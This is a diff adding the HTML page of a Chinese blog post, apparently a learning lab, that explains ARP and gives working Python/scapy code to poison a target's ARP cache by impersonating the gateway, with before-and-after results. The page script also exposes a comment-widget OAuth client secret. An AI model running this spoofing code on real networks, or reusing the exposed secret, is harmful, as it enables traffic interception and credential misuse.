@@ -1,0 +1,198 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>基于python的ARP投毒实验 | Farmer</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1.0"><link rel="stylesheet" type="text/css" href="/css/dark.css?v=1.1.0"><link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/pure/2.1.0/pure-min.min.css"><link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/pure/2.1.0/grids-responsive-min.min.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = 'https://hm.baidu.com/hm.js?' + 'b9d3811fb8d19b04438737cb71b15c9e';
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+  })();
+</script><script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.10/clipboard.min.js"></script><script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css"><div class="darkmode-toggle">🌓</div><script>var prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)');
+var toggle = document.querySelector('.darkmode-toggle');
+var html = document.querySelector('html');
+
+html.dataset.dark = localStorage.dark || prefersDarkMode.matches;
+
+toggle.addEventListener('click', () => {
+localStorage.dark = !(html.dataset.dark == 'true');
+html.dataset.dark = localStorage.dark;
+});</script><meta name="generator" content="Hexo 4.2.1"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">基于python的ARP投毒实验</h1><a id="logo" href="/.">Farmer</a><p class="description">-Farmer的自习室</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/readings/"><i class="fa fa-bookmark"> 阅读清单</i></a><a href="/history/"><i class="fa fa-book"> 历史</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">基于python的ARP投毒实验</h1><div class="post-meta">2020-04-30<span> | </span><span class="category"><a href="/categories/%E6%90%9E%E4%BA%8B%E6%83%85/">搞事情</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span><span class="post-time"><span class="post-meta-item-text"> | </span><span class="post-meta-item-icon"><i class="fa fa-keyboard-o"></i><span class="post-count"> 1.5k</span><span class="post-meta-item-text"> 字</span></span></span><span class="post-time"> | <span class="post-meta-item-icon"><i class="fa fa-clock-o"></i><span class="post-count"> 5</span><span class="post-meta-item-text"> 分钟</span></span></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ARP协议基础"><span class="toc-number">2.</span> <span class="toc-text">ARP协议基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ARP协议是什么"><span class="toc-number">2.1.</span> <span class="toc-text">ARP协议是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ARP报文格式"><span class="toc-number">2.2.</span> <span class="toc-text">ARP报文格式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基本思路"><span class="toc-number">3.</span> <span class="toc-text">基本思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#实验代码"><span class="toc-number">3.1.</span> <span class="toc-text">实验代码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#获取目标Mac地址"><span class="toc-number">3.1.1.</span> <span class="toc-text">获取目标Mac地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#向主机A投毒"><span class="toc-number">3.1.2.</span> <span class="toc-text">向主机A投毒</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#恢复目标ARP缓存"><span class="toc-number">3.1.3.</span> <span class="toc-text">恢复目标ARP缓存</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实验结果"><span class="toc-number">3.2.</span> <span class="toc-text">实验结果</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#投毒前数据"><span class="toc-number">3.2.1.</span> <span class="toc-text">投毒前数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#投毒后数据"><span class="toc-number">3.2.2.</span> <span class="toc-text">投毒后数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-number">4.</span> <span class="toc-text">参考资料</span></a></li></ol></div></div><div class="post-content"><p>这一年里学习了许多网络方面的知识，其中ARP协议被誉为“最不安全的网络协议”。<br>最近闲来无事，造一下轮子并且复习一下相关方面知识的印象。做了一个ARP投毒实验，感觉这东西蛮好玩的。</p>
+<a id="more"></a>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前置说明:<br>ARP投毒有多种思路，本文仅以其中一个为栗子进行实验，其他方法思路基本差不多。</p>
+<p>前置条件：</p>
+<ul>
+<li>基本的计算机网络基础</li>
+<li>ARP协议</li>
+<li>python3</li>
+<li>需要用到的库<ul>
+<li>scapy</li>
+</ul>
+</li>
+<li>两台能通信的设备</li>
+</ul>
+<p>ARP欺骗的方法：</p>
+<ul>
+<li><input disabled="" type="checkbox"> ARP中间人欺骗投毒</li>
+<li><input checked="" disabled="" type="checkbox"> ARP伪装网关投毒</li>
+</ul>
+<h2 id="ARP协议基础"><a href="#ARP协议基础" class="headerlink" title="ARP协议基础"></a>ARP协议基础</h2><h3 id="ARP协议是什么"><a href="#ARP协议是什么" class="headerlink" title="ARP协议是什么"></a>ARP协议是什么</h3><p>当一台主机和另一台主机通信，要知道目标的IP地址，但在局域网中传输数据网卡却不能直接识别IP地址，所以用ARP解析协议讲IP地址解析成MAC地址。<br>ARP协议的基本功能就是通过目标设备的IP地址来查询目标设备的mac地址，举个栗子：(局域网中有如下主机)</p>
+<table>
+<thead>
+<tr>
+<th align="center">主机</th>
+<th align="center">IP地址</th>
+<th align="center">MAC地址</th>
+<th align="center">网关</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">A</td>
+<td align="center">192.168.2.2</td>
+<td align="center">Mac-a</td>
+<td align="center">192.168.2.1</td>
+</tr>
+<tr>
+<td align="center">B</td>
+<td align="center">192.168.2.3</td>
+<td align="center">Mac-b</td>
+<td align="center">192.168.2.1</td>
+</tr>
+<tr>
+<td align="center">C</td>
+<td align="center">192.168.2.4</td>
+<td align="center">mac-c</td>
+<td align="center">192.168.2.1</td>
+</tr>
+</tbody></table>
+<p>主机A会先查询自己的ARP缓存表里有没有B的联系方式，有的话，就将mac-b地址封装到数据包外面，发送出去。没有的话，A会向全网络发送一个</p>
+<p>ARP广播包，大声询问：我的IP地址是192.168.2.2，硬件地址是mac-a，我想知道IP地址是192.168.2.3的硬件地址是多少？<br>此时，局域网内所有主机都收到了，B收到后会单独私密回应：我是192.168.2.3，我的硬件地址是mac-b，其他主机不会理A的询问。<br>此时A知道了B的信息，同时也会动态的更新自身的缓存表</p>
+<h3 id="ARP报文格式"><a href="#ARP报文格式" class="headerlink" title="ARP报文格式"></a>ARP报文格式</h3><p>ARP报文分为ARP请求和ARP应答报文两种，它们的报文格式可以统一为下图所示：</p>
+<img src="/2020/04/30/ARP%E6%8A%95%E6%AF%92%E5%AE%9E%E9%AA%8C/ARP-header.png" class="" title="arp-header">  
+
+<p>ARP 报文总长度为 28 字节，MAC 地址长度为 6 字节，IP 地址长度为 4 字节。<br>其中每个字段的含义如下：  </p>
+<ul>
+<li>硬件类型：表示ARP报文可以在哪种类型的网络上传输，值为1时表示为以太网地址。</li>
+<li>协议类型：表示要映射的协议地址类型。它的值为 0x0800，表示 IP 地址。</li>
+<li>MAC地址长度：标识MAC地址长度，值为6。</li>
+<li>IP协议地址长度：标识IP的长度，值为4。</li>
+<li>操作类型：用来表示这个报文的类型，ARP 请求为 1，ARP 响应为 2，RARP 请求为 3，RARP 响应为 4。</li>
+<li>源MAC地址：占6字节，标识发送设备的硬件地址。(发送方 MAC 地址)</li>
+<li>源IP地址：标识发送方设备的IP地址。(发送方设备的 IP 地址。)</li>
+<li>目的MAC地址：表示接收方设备的硬件地址。<ul>
+<li>广播地址：FF:FF:FF:FF:FF:FF,局域网内所有用户都能收到</li>
+<li>单播地址：前24位为厂商地址中， Individual/Group(I/G)位为1。</li>
+</ul>
+</li>
+<li>目的IP地址：表示接受方的IP地址。</li>
+</ul>
+<p>不过这里要注意，ARP报文部署直接在网络层上发送的，它还需要向下传输到数据链路层，所以当ARP报文传输到数据链路层后，还要进行封装。不过这个实验不需要用到，因此不作说明。</p>
+<h2 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h2><!-- ### ARP中间人欺骗攻击 -->
+<img src="/2020/04/30/ARP%E6%8A%95%E6%AF%92%E5%AE%9E%E9%AA%8C/arp_practice.png" class="" title="practice_gateway">
+<p>通过上面的铺垫我们知道，网络通信的实现是需要mac地址的，并且是以mac地址为准的。<br>假设当前主机A的ARP表记录的网关mac地址是：<code>11:11:11:11:11:11</code>,如果我们告诉主机A，网关的地址是:<code>22:22:22:22:22:22</code>。那么主机A之后发送给网关的数据包都会发送到<code>22:22:22:22:22:22</code>这个地址上。<br>这就是简单的ARP伪装网关欺骗攻击，可以结合上图进行理解，但图片来源于网络可能不太准确。<br>代码部分我会拆分成各个模块进行说明，实验如下：</p>
+<h3 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h3><h4 id="获取目标Mac地址"><a href="#获取目标Mac地址" class="headerlink" title="获取目标Mac地址"></a>获取目标Mac地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 指定以太网的网卡</span></span><br><span class="line">    interface = <span class="string">"eth0"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 填写网关IP</span></span><br><span class="line">    gateway_ip = <span class="string">"1.1.1.1"</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 填写投毒目标IP</span></span><br><span class="line">    target_ip = <span class="string">"1.1.1.1"</span></span><br><span class="line">    conf.iface = interface</span><br><span class="line">    conf.verb = <span class="number">0</span> </span><br><span class="line"></span><br><span class="line">    gateway_mac = getmacbyip(gateway_ip)</span><br><span class="line">    <span class="comment">#获取目标mac地址</span></span><br><span class="line">    target_mac = getmacbyip(target_ip)</span><br><span class="line">    <span class="keyword">if</span> target_mac <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        print(<span class="string">"目标IP获取失败"</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"目标MAC地址： %s"</span>%target_mac)</span><br></pre></td></tr></table></figure>
+<h4 id="向主机A投毒"><a href="#向主机A投毒" class="headerlink" title="向主机A投毒"></a>向主机A投毒</h4><p>相比于中文翻译的报文格式，查看原生的报文格式会更容易理解。</p>
+<img src="/2020/04/30/ARP%E6%8A%95%E6%AF%92%E5%AE%9E%E9%AA%8C/thr-format-arp-packet.png" class="" title="format-arp">
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attact_target</span><span class="params">(gateway_ip, gateway_mac, target_ip, target_mac)</span>:</span></span><br><span class="line">    <span class="comment"># 这一部分的内容上文都有详解</span></span><br><span class="line">    <span class="comment"># 初始化一个ARP包，并填入各项内容</span></span><br><span class="line">    poison_target = ARP()</span><br><span class="line">    poison_target.op = <span class="number">2</span></span><br><span class="line">    poison_target.psrc = gateway_ip</span><br><span class="line">    poison_target.pdst = target_ip</span><br><span class="line">    poison_target.hwdst = target_mac</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送数据包，高频发送ARP包，以防给刷新</span></span><br><span class="line">    print(<span class="string">"正在投毒..."</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            send(poison_target)</span><br><span class="line">            sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="comment"># 投毒结束，恢复目标ARP缓存</span></span><br><span class="line">            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="恢复目标ARP缓存"><a href="#恢复目标ARP缓存" class="headerlink" title="恢复目标ARP缓存"></a>恢复目标ARP缓存</h4><p>原理和投毒一样，只不过反了过来，自行理解。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">restore = ARP()</span><br><span class="line">restore.op = <span class="number">2</span></span><br><span class="line">restore.psrc = gateway_ip</span><br><span class="line">restore.pdst = target_ip</span><br><span class="line">restore.hwdst = target_mac</span><br><span class="line">restore.hwsrc = gateway_mac</span><br><span class="line">send(restore,count=<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><h4 id="投毒前数据"><a href="#投毒前数据" class="headerlink" title="投毒前数据"></a>投毒前数据</h4><img src="/2020/04/30/ARP%E6%8A%95%E6%AF%92%E5%AE%9E%E9%AA%8C/windows_st.png" class="" title="practice_start">
+
+<p>总结如下表：</p>
+<table>
+<thead>
+<tr>
+<th align="center">主机</th>
+<th align="center">IP地址</th>
+<th align="center">MAC地址</th>
+<th align="center">备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">网关</td>
+<td align="center">192.168.2.1</td>
+<td align="center">18-31-bf-47-1c-98</td>
+<td align="center">本地网关</td>
+</tr>
+<tr>
+<td align="center">Windows10</td>
+<td align="center">192.168.2.200</td>
+<td align="center"></td>
+<td align="center">靶机</td>
+</tr>
+<tr>
+<td align="center">Linux</td>
+<td align="center">192.168.2.123</td>
+<td align="center">00-cf-e0-40-02-60</td>
+<td align="center">投毒机</td>
+</tr>
+</tbody></table>
+<h4 id="投毒后数据"><a href="#投毒后数据" class="headerlink" title="投毒后数据"></a>投毒后数据</h4><img src="/2020/04/30/ARP%E6%8A%95%E6%AF%92%E5%AE%9E%E9%AA%8C/running.png" class="" title="run">
+
+<p>总结如下表：</p>
+<table>
+<thead>
+<tr>
+<th align="center">主机</th>
+<th align="center">IP地址</th>
+<th align="center">MAC地址</th>
+<th align="center">备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">网关</td>
+<td align="center">192.168.2.1</td>
+<td align="center">00-cf-e0-40-02-60</td>
+<td align="center">本地网关</td>
+</tr>
+<tr>
+<td align="center">Windows10</td>
+<td align="center">192.168.2.200</td>
+<td align="center"></td>
+<td align="center">靶机</td>
+</tr>
+<tr>
+<td align="center">Linux</td>
+<td align="center">192.168.2.123</td>
+<td align="center">00-cf-e0-40-02-60</td>
+<td align="center">投毒机</td>
+</tr>
+</tbody></table>
+<p>由此可见，通过ARP投毒污染，靶机<code>192.168.2.1</code>对应的mac地址已与Linux投毒机一致，说明投毒成功。实验结束。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>ARP参考资料1：<a href="https://blog.csdn.net/u011784495/article/details/71716586" target="_blank" rel="noopener">https://blog.csdn.net/u011784495/article/details/71716586</a><br>投毒污染参考资料2：<a href="https://blog.csdn.net/zhydream77/article/details/85334042" target="_blank" rel="noopener">https://blog.csdn.net/zhydream77/article/details/85334042</a></p>
+<!-- 
+```flow
+st=>start: 主机A和主机B通信
+A_cond_in_arp=>condition: A的ARP表中是否存在B的地址
+
+# A_not_have_B_mac=>operation: 主机A的ARP缓存中没有主机B的地址
+A_ask_all_where_B=>operation: 主机A发送一个ARP广播包
+
+Is_B_in_network=>condition: 主机B是否在网络中
+B_in_network=>operation: B收到后回复
+B_in_A_do=>operation: 主机A修改自己ARP缓存
+B_not_in_network=>operation: done
+
+A_have_B_mac=>end: 主机A与主机B通信
+end_2=>end: 主机A与主机B通信
+end_3=>end: done
+
+st->A_cond_in_arp
+A_cond_in_arp(yes)->A_have_B_mac
+A_cond_in_arp(no)->A_ask_all_where_B->Is_B_in_network
+
+Is_B_in_network(yes)->B_in_network->B_in_A_do->end_2
+Is_B_in_network(no)->end_3
+``` -->
+</div><div id="donate"><link rel="stylesheet" type="text/css" href="/css/donate.css"><script type="text/javascript" src="/js/donate.js" successtext="复制成功!"></script><a class="pos-f tr3" id="github" href="https://github.com/farmerChillax" target="_blank" rel="noopener" arget="_blank" title="Github"></a><div id="DonateText">Donate</div><ul class="list pos-f" id="donateBox"><li id="AliPay" qr="/img/AliPayQR.jpg"></li><li id="WeChat" qr="/img/WeChatQR.jpg"></li></ul><div class="pos-f left-100" id="QRBox"><div id="MainBox"></div></div></div><script type="text/javascript" src="/js/share.js?v=1.1.0" async></script><a class="article-share-link" data-url="https://blog.farmer233.top/2020/04/30/ARP%E6%8A%95%E6%AF%92%E5%AE%9E%E9%AA%8C/" data-id="cl3kx4azv000emd32bcqp4ryv" data-qrcode="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACsklEQVR42u3aQW7jMAwF0N7/0h1gMIsBUtufItlk8bwKFEPSkwFTJvX1FV/ff6/Xltf2zr//t7zec9XbwIWHh4d3NPWr62rgZBJXvSVzyMd9GAUPDw9vjXcfDO5J1eDR6S2fMx4eHt4n8Kob3OrC9UfHw8PD+zRePw0xu6XGw8PDey8vSUbcf/YnaYgofRDcuZJrwcPDw4t51QLYJ/xerO/h4eHhNarq1dfu7EGBzgz/9YOHh4e3wDtLH+T358tRPbhQCBh4eHh4o7z7j/zqwDnsbItcfQB4eHh4e7yzstZsQvY++XtWPMPDw8P7fV41AZGUx+6DSh6oohni4eHhLfOSgtNZOSph5AuUhxw8PDy8d/GqQ3YCT9JbYWnw8PDwFnhTqdiNgwVnKd0f2vHw8PBGeWflrnyzm4+StJc363h4eHhrvLNifycYnG2+k4D0UADDw8PDG+JVjwt0ymBngeQ+aF0GMzw8PLw13mzJauq1Xi2PPcQ9PDw8vCFekpbNUwZJn/1tdPUB4OHh4W3wElK1lNXZrFeLYQ9IPDw8vFFe9RjTFCDfpudluR8eAB4eHt4Cb6rYn6cPkoLZ2ZGF6FsBDw8Pb4iXv4jPkqfVnjtP6SEZgYeHh9fmVYfplKOijW+MiR4AHh4e3gKvU6bKkxHVdEPeUpgVHh4e3gJvKquRTKi6cGdLjIeHh7fHq3ZXPTI19TtfiMvvBjw8PLwFXichmydhz9IfY2fK8PDw8Bq87+JVTadWN9NJkCgsCh4eHt4Cr/rCPStTnY3SZ+Ph4eHt8TYOQp31WT0KliSL8fDw8PZ4U0em8qCSJ4XPinZ4eHh4n8OrJmqrhatkKfM78fDw8N7L6xf4O/1Ut9p4eHh427zyYaajJegfqMqTyHh4eHh7vI3SVHUhZsMPHh4e3hrvD+bmnHE7V2DyAAAAAElFTkSuQmCC">分享</a><div class="tags"><a href="/tags/python/"><i class="fa fa-tag"></i>python</a><a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"><i class="fa fa-tag"></i>计算机网络基础</a><a href="/tags/Linux/"><i class="fa fa-tag"></i>Linux</a><a href="/tags/%E7%AC%94%E8%AE%B0/"><i class="fa fa-tag"></i>笔记</a></div><div class="post-nav"><a class="pre" href="/2020/05/15/Leetcode%E5%88%B7%E9%A2%98-%E7%AC%AC136%E9%A2%98%EF%BC%9A%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E6%95%B0%E5%AD%97/">[Leetcode刷题]第136题：只出现一次的数字</a><a class="next" href="/2020/04/27/Leetcode%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%89%E9%A2%98%EF%BC%9A%E6%97%A0%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E6%9C%80%E9%95%BF%E5%AD%97%E4%B8%B2/">[Leetcode刷题]第三题：无重复字符的最长字串</a></div><div id="container"></div><link rel="stylesheet" type="text/css" href="//unpkg.com/gitalk/dist/gitalk.css?v=1.1.0"><script type="text/javascript" src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js?v=1.1.0"></script><script type="text/javascript" src="//unpkg.com/gitalk/dist/gitalk.min.js?v=1.1.0"></script><script>var gitalk = new Gitalk({
+  clientID: '0a5a339e4c6a3cc81b76',
+  clientSecret: 'ce2b79ca94465b2a758faca9e0b95e4df38d6204',
+  repo: 'FarmerChillax.github.io',
+  owner: 'FarmerChillax',
+  admin: ['FarmerChillax'],
+  id: md5(location.pathname),
+  distractionFreeMode: false
+})
+gitalk.render('container')
+</script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AD%A6%E4%BA%86%E4%BA%9B%E4%BB%80%E4%B9%88/">学了些什么</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%90%9E%E4%BA%8B%E6%83%85/">搞事情</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%83%A1%E6%80%9D%E4%B9%B1%E8%AF%AD/">胡思乱语</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/Golang/" style="font-size: 15px;">Golang</a> <a href="/tags/%E8%83%A1%E8%A8%80%E4%B9%B1%E8%AF%AD/" style="font-size: 15px;">胡言乱语</a> <a href="/tags/python/" style="font-size: 15px;">python</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" style="font-size: 15px;">计算机网络基础</a> <a href="/tags/Linux/" style="font-size: 15px;">Linux</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 15px;">笔记</a> <a href="/tags/%E7%88%AC%E8%99%AB/" style="font-size: 15px;">爬虫</a> <a href="/tags/%E6%AD%A3%E6%96%B9%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F/" style="font-size: 15px;">正方教务系统</a> <a href="/tags/nginx/" style="font-size: 15px;">nginx</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/JavaScript/" style="font-size: 15px;">JavaScript</a> <a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 15px;">C语言</a> <a href="/tags/%E5%88%B7%E9%A2%98/" style="font-size: 15px;">刷题</a> <a href="/tags/PTA/" style="font-size: 15px;">PTA</a> <a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 15px;">前端</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" style="font-size: 15px;">算法和数据结构</a> <a href="/tags/leetcode/" style="font-size: 15px;">leetcode</a> <a href="/tags/%E4%BD%8D%E8%BF%90%E7%AE%97/" style="font-size: 15px;">位运算</a> <a href="/tags/%E5%93%88%E5%B8%8C%E8%A1%A8/" style="font-size: 15px;">哈希表</a> <a href="/tags/Sliding-Window/" style="font-size: 15px;">Sliding Window</a> <a href="/tags/%E9%93%BE%E8%A1%A8/" style="font-size: 15px;">链表</a> <a href="/tags/DDNS/" style="font-size: 15px;">DDNS</a> <a href="/tags/%E7%94%9F%E6%B4%BB%E8%AE%B0%E5%BD%95/" style="font-size: 15px;">生活记录</a> <a href="/tags/%E5%90%90%E6%A7%BD/" style="font-size: 15px;">吐槽</a> <a href="/tags/%E9%BB%91%E6%9A%97%E6%96%99%E7%90%86/" style="font-size: 15px;">黑暗料理</a> <a href="/tags/TypeScript/" style="font-size: 15px;">TypeScript</a> <a href="/tags/vs-code/" style="font-size: 15px;">vs code</a> <a href="/tags/%E6%8F%92%E4%BB%B6/" style="font-size: 15px;">插件</a> <a href="/tags/Flask-APIFlask/" style="font-size: 15px;">Flask/APIFlask</a> <a href="/tags/emotion/" style="font-size: 15px;">emotion</a> <a href="/tags/Rust/" style="font-size: 15px;">Rust</a> <a href="/tags/%E8%93%9D%E6%A1%A5%E6%9D%AF/" style="font-size: 15px;">蓝桥杯</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2022/03/15/%E7%94%9F%EF%BC%8C%E6%B4%BB/">生，活</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/09/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E7%94%A8APIFlask%E5%81%9A%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1%E2%80%94%E2%80%94%E5%90%8E%E7%AB%AF/">手把手教你用APIFlask做毕业设计后端—基本简介与Hello APIFlask!(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/15/%E7%94%A8Rust%E4%B8%BAPython%E5%8A%A0%E5%8F%8C%E7%BF%85%E8%86%80/">用Rust为Python加双翅膀</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/12/08/%E7%A7%8B%E6%8B%9B%E6%9D%82%E8%B0%88/">校招杂谈</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/07/Review-of-life-in-university/">Review of life in university ✔</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/05/A-distributed-with-Go/">A distributed system with Go</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/03/%E6%96%B0%E7%89%88%E6%AD%A3%E6%96%B9%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F%E7%99%BB%E5%BD%95%E5%AE%9E%E7%8E%B0/">新版正方教务系统登录实现</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/08/20/Golang%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/">Golang基础语法笔记 | 数组、切片&映射</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/08/07/%E6%8F%90%E9%97%AE%E4%B8%AD%E9%9C%80%E8%A6%81%E9%81%BF%E5%85%8D%E7%9A%84%E4%B8%80%E4%BA%9B%E8%A1%8C%E4%B8%BA/">提问中需要避免的一些行为</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/08/02/Leetcode-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%A2%98%E7%9B%AE%E9%9B%86%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E5%A4%A9/">[Leetcode]数据结构题目集的最后一天</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="https://blog.xiaotao233.top/" title="咸鱼的窝" target="_blank">咸鱼的窝</a><ul></ul><a href="https://blog.diyxi.top/" title="DIY，熙!" target="_blank">DIY，熙!</a><ul></ul><a href="https://darkroom.vip/" title="Dark的小黑屋" target="_blank">Dark的小黑屋</a><ul></ul><a href="https://blog.ziki2333.top/" title="ziki" 